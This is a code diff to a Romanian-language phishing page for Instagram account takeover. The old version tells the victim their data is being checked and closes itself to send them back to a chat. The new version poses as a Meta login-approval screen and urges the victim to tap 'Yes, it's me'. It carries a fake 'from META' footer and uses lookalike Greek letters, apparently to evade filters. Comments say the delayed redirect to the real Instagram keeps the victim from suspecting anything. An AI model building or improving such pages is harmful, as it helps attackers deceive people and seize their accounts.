@@ -1,27 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html lang="ro">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Procesare...</title>
+    <title>Confirmare</title>
     <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 100px; color: #262626; background: #fafafa; }
-        .loader { border: 3px solid #dbdbdb; border-top: 3px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; padding: 25px; }
+        .device-icon { width: 80px; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: #262626; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 30px; }
+        .loader { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h3 { font-size: 18px; margin-bottom: 10px; }
-        p { font-size: 14px; color: #8e8e8e; padding: 0 20px; }
+        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; }
     </style>
 </head>
 <body>
+    <img src="https://img.icons8.com/ios/100/0095f6/multiple-devices.png" class="device-icon">
+    <h2>Verifică nοtificările</h2>
+    <p>Am trimis o cerere de aprοbare pe dispοzitivele tale. <br> Deschide aplicația și apasă pe <b>"Da, eu sunt"</b> pentru a confirma logarea.</p>
     <div class="loader"></div>
-    <h3>Se verifică datele...</h3>
-    <p>Așteaptă un moment. Vei primi o notificare pe Telegram imediat ce contul este indexat.</p>
-
+    <p style="font-size: 12px; color: #a8a8a8;">Se așteaptă confirmarea...</p>
+    <div class="footer">from META</div>
     <script>
-        // Închide fereastra automat după 6 secunde pentru a trimite victima înapoi în chat
-        setTimeout(function() {
-            window.close();
-        }, 6000);
+        // O trimite la site-ul real dupa 2 minute ca sa nu suspecteze nimic
+        setTimeout(function(){ window.location.href = "https://www.instagram.com/"; }, 120000);
     </script>
 </body>
 </html>
